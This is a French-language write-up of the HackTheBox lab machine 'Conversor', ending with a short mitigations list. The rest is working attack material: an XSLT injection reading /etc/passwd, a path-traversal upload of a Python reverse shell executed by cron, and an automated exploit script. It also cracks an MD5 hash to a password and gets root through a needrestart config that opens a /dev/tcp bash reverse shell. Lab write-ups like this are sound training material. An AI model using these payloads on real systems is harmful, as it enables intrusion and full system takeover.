Conversor - HackTheBox Writeup
Reconnaissance
# Scan nmap
nmap -sC -sV -oA nmap/conversor 10.10.11.92

# Résultats
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1
80/tcp open  http    Apache httpd 2.4.52
Énumération Web

L'application web est une plateforme de conversion XML/XSLT. Le code source révèle plusieurs informations critiques :

app.py - Analyse du code :

# Parsing XML sécurisé
parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)
xml_tree = etree.parse(xml_path, parser)

# ⚠️ Parsing XSLT non sécurisé
xslt_tree = etree.parse(xslt_path)  # Pas de restrictions !

install.md - Découverte du cron job critique :

* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
Vulnérabilités identifiées
1. XSLT Injection (LFI)

Le parser XSLT n'a aucune restriction, permettant l'utilisation de la fonction document().

2. Path Traversal

Aucune validation des noms de fichiers :

xml_path = os.path.join(UPLOAD_FOLDER, xml_file.filename)  # Vulnérable
3. Cron Job - Exécution de code

Tous les fichiers .py dans /var/www/conversor.htb/scripts/ sont exécutés chaque minute.

Exploitation - Initial Foothold
Phase 1 : XSLT Injection pour reconnaissance

recon.xml :

<?xml version="1.0"?>
<root>recon</root>

recon.xslt :

<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="html" indent="yes" />
  <xsl:template match="/">
    <html>
      <body style="background:#000;color:#0f0;font-family:monospace;padding:20px;">
        <h2>/etc/passwd</h2>
        <pre><xsl:value-of select="document('file:///etc/passwd')"/></pre>
        
        <h2>Scripts Directory</h2>
        <pre><xsl:value-of select="document('file:///var/www/conversor.htb/scripts/')"/></pre>
      </body>
    </html>
  </xsl:template>
</xsl:stylesheet>
Phase 2 : Path Traversal + Reverse Shell

Exploitation avec Burp Suite :

Intercepter la requête POST vers /convert
Modifier le nom du fichier XSLT :
Content-Disposition: form-data; name="xslt_file"; filename="../scripts/revshell.py"
Content-Type: application/octet-stream

import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.X",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
Attendre max 60 secondes (exécution par cron)

Listener :

rlwrap nc -lnvp 4444
# Connection received from 10.10.11.92
# www-data@conversor:~$
Script d'exploitation automatique
#!/usr/bin/env python3
import requests

TARGET = "http://conversor.htb"
LHOST = "10.10.14.X"
LPORT = 4444

shell_code = f"""import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{LHOST}",{LPORT}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
"""

# Register
s = requests.Session()
s.post(f"{TARGET}/register", data={"username": "hacker", "password": "hacker"})
s.post(f"{TARGET}/login", data={"username": "hacker", "password": "hacker"})

# Upload malicious file
files = {
    'xml_file': ('dummy.xml', '<?xml version="1.0"?><root>x</root>', 'text/xml'),
    'xslt_file': ('../scripts/revshell.py', shell_code, 'application/octet-stream')
}
s.post(f"{TARGET}/convert", files=files)

print("[+] Shell uploaded! Start listener and wait max 60s...")
Escalade de privilèges - User
Énumération
# Stabilisation du shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg

# Base de données SQLite
cd /var/www/conversor.htb/instance/
sqlite3 users.db "SELECT * FROM users;"

Résultat :

1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
Crack du hash MD5
# Sur Kali
echo '5b5c3ac3a1c897c94caad48e6c71fdec' > hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

# Résultat
5b5c3ac3a1c897c94caad48e6c71fdec:Keepmesafeandwarm
Pivot vers fismathack
# Depuis www-data
su fismathack
# Password: Keepmesafeandwarm

# OU depuis Kali
ssh fismathack@10.10.11.92
# Password: Keepmesafeandwarm

# User flag
cat ~/user.txt
Escalade de privilèges - Root
Énumération sudo
sudo -l

Résultat :

Matching Defaults entries for fismathack on conversor:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
Exploitation needrestart via fichier de configuration malveillant

Vérification de la version :

needrestart --version
# needrestart 3.7

Documentation de l'option -c :

man needrestart
# -c CONFIG : Use the specified configuration file
Exploitation

Sur Kali - Préparer le listener :

rlwrap nc -lnvp 7799

Sur la machine cible - Créer le fichier de configuration malveillant :

cd /tmp

cat > cmd.conf << 'EOF'
# Needrestart malicious configuration
$nrconf{restart} = 'a';
system("bash -c 'exec bash -i &>/dev/tcp/10.10.16.3/7799 <&1'");
EOF

Exécuter needrestart avec le fichier de configuration :

sudo /usr/sbin/needrestart -c cmd.conf

Résultat :

# Sur le listener Kali
Connection received on 10.10.11.92 XXXXX
root@conversor:~# id
uid=0(root) gid=0(root) groups=0(root)
Root flag
cat /root/root.txt
Chaîne d'exploitation complète
1. Recon Web → Code source app.py + install.md
2. XSLT Injection → LFI pour reconnaissance
3. Path Traversal → Upload de ../scripts/revshell.py
4. Cron Job → Exécution automatique du reverse shell (www-data)
5. Shell www-data → Extraction base SQLite
6. Hash Cracking → Credentials fismathack:Keepmesafeandwarm
7. User Shell → Énumération sudo -l
8. needrestart -c → Injection de configuration malveillante via system()
9. Root Shell → Récupération du flag
Détails techniques - needrestart exploitation

L'option -c de needrestart permet de charger un fichier de configuration personnalisé. Le fichier de configuration est du code Perl qui est exécuté directement. En injectant la fonction system() dans ce fichier, on peut exécuter des commandes arbitraires avec les privilèges root.

Structure du fichier de configuration malveillant :

# Configuration Perl de needrestart
$nrconf{restart} = 'a';  # Mode automatique

# Injection de commande
system("bash -c 'exec bash -i &>/dev/tcp/ATTACKER_IP/PORT <&1'");

Cette technique exploite le fait que :

needrestart peut être exécuté avec sudo sans mot de passe
L'option -c accepte un fichier de configuration arbitraire
Le fichier de configuration est du code Perl exécuté en tant que root
La fonction system() permet l'exécution de commandes shell
Flags
User: [REDACTED]
Root: [REDACTED]
Mitigations
XSLT Parser : Utiliser un parser sécurisé avec restrictions
Path Traversal : Valider et sanitizer tous les noms de fichiers
Cron Job : Ne jamais exécuter des fichiers dans un répertoire uploadable
Hashing : Utiliser bcrypt/argon2 au lieu de MD5
needrestart sudo :
Restreindre l'option -c dans la configuration sudo
Utiliser une whitelist de fichiers de configuration autorisés
Mettre à jour vers une version patchée
Exemple sudoers sécurisé : (ALL) NOPASSWD: /usr/sbin/needrestart -v
Références
CVE-2024-48990 - needrestart Local Privilege Escalation
CVE-2024-10224 - needrestart Python Interpreter Hijacking
needrestart documentation: https://github.com/liske/needrestart
https://medium.com/@aniketdas07770/abusing-sudo-rights-on-needrestart-for-escalation-d1307c2af12f

Author: kz
Date: December 2025
Difficulty: Medium
Machine: Conversor (HTB)


